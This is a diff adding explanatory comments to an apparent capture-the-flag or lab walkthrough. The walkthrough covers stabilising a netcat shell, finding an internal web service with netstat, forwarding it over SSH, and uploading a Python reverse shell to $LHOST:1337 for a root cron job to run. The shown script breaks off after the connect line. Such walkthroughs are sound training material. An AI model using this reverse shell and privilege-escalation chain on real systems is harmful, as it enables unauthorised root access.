@@ -106,9 +106,15 @@ Stabilise:
 # What it does: spawn a PTY shell using Python.
 # Why here: upgrade the simple netcat shell to a more functional interactive terminal.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+# What it does: set the terminal type for the current session.
+# Why here: ensure compatibility with terminal-based applications like clear or nano.
 export TERM=xterm
+# What it does: put the current job in the background and set the terminal to raw mode.
+# Why here: enable full interactive terminal features like tab-completion and arrow keys.
 # Ctrl+Z
 stty raw -echo; fg
+# What it does: reset the terminal configuration to default.
+# Why here: fix terminal rendering after switching to raw mode.
 reset
 ```
 
@@ -215,6 +221,8 @@ tail -f /var/log/syslog | grep -i cron
 
 Find the internal web that drops files into `/root/company/media/`:
 ```bash
+# What it does: list all listening network sockets and their processes.
+# Why here: identify internal-only services (like 127.0.0.1:8080) that are not visible from the outside.
 netstat -tulpn
 # tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
 ```
@@ -229,6 +237,8 @@ ssh -L 8080:localhost:8080 king@$TARGET
 
 Drop a Python reverse shell `.py` through the uploader (it lands under `/root/company/media/`):
 ```python
+# What it does: define a standard Python reverse shell.
+# Why here: create a malicious script to be uploaded and executed by the root cron job.
 import socket,subprocess,os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("$LHOST", 1337))
